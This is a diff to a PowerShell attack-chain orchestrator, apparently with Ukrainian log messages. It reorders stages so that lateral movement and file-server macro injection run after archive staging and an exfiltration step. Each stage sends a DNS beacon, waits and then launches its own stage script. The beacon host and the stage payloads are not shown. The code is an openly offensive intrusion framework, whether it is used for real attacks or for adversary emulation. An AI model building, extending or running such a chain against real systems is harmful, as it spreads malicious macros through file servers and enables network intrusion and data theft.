@@ -170,40 +170,6 @@ if (Test-BlockDone -Markers $B3_MARKERS) {
     }
 }
 
-# ── Block 6: Lateral Movement ─────────────────────────────────────────────────
-
-if (Test-BlockDone -Markers $B6_MARKERS) {
-    Write-Log "Block 6 вже виконано — пропускаємо"
-} else {
-    Write-Log "Chain → Block 6 (затримка $DelayBetweenBlocks сек)"
-    Invoke-DnsBeacon -Label "B1:CHAIN:B6"
-    Start-Sleep -Seconds $DelayBetweenBlocks
-
-    $b6_script = Join-Path $BLOCKS_DIR "block6_lateral.ps1"
-    if (Test-Path $b6_script) {
-        & $b6_script
-    } else {
-        Write-Log "block6_lateral.ps1 не знайдено у $BLOCKS_DIR" -Level "ERROR"
-    }
-}
-
-# ── Block 7: File Server Macro Injection ──────────────────────────────────────
-
-if (Test-BlockDone -Markers $B7_MARKERS) {
-    Write-Log "Block 7 вже виконано — пропускаємо"
-} else {
-    Write-Log "Chain → Block 7 (затримка $DelayBetweenBlocks сек)"
-    Invoke-DnsBeacon -Label "B1:CHAIN:B7"
-    Start-Sleep -Seconds $DelayBetweenBlocks
-
-    $b7_script = Join-Path $BLOCKS_DIR "block7_fileserver.ps1"
-    if (Test-Path $b7_script) {
-        & $b7_script
-    } else {
-        Write-Log "block7_fileserver.ps1 не знайдено у $BLOCKS_DIR" -Level "ERROR"
-    }
-}
-
 # ── Block 4: Archive Staging ──────────────────────────────────────────────────
 
 if (Test-BlockDone -Markers $B4_MARKERS) {
@@ -235,6 +201,40 @@ if (Test-BlockDone -Markers $B5_MARKERS) {
         & $b5_script
     } else {
         Write-Log "block5_exfil.ps1 не знайдено у $BLOCKS_DIR" -Level "ERROR"
+    }
+}
+
+# ── Block 6: Lateral Movement ─────────────────────────────────────────────────
+
+if (Test-BlockDone -Markers $B6_MARKERS) {
+    Write-Log "Block 6 вже виконано — пропускаємо"
+} else {
+    Write-Log "Chain → Block 6 (затримка $DelayBetweenBlocks сек)"
+    Invoke-DnsBeacon -Label "B1:CHAIN:B6"
+    Start-Sleep -Seconds $DelayBetweenBlocks
+
+    $b6_script = Join-Path $BLOCKS_DIR "block6_lateral.ps1"
+    if (Test-Path $b6_script) {
+        & $b6_script
+    } else {
+        Write-Log "block6_lateral.ps1 не знайдено у $BLOCKS_DIR" -Level "ERROR"
+    }
+}
+
+# ── Block 7: File Server Macro Injection ──────────────────────────────────────
+
+if (Test-BlockDone -Markers $B7_MARKERS) {
+    Write-Log "Block 7 вже виконано — пропускаємо"
+} else {
+    Write-Log "Chain → Block 7 (затримка $DelayBetweenBlocks сек)"
+    Invoke-DnsBeacon -Label "B1:CHAIN:B7"
+    Start-Sleep -Seconds $DelayBetweenBlocks
+
+    $b7_script = Join-Path $BLOCKS_DIR "block7_fileserver.ps1"
+    if (Test-Path $b7_script) {
+        & $b7_script
+    } else {
+        Write-Log "block7_fileserver.ps1 не знайдено у $BLOCKS_DIR" -Level "ERROR"
     }
 }
 
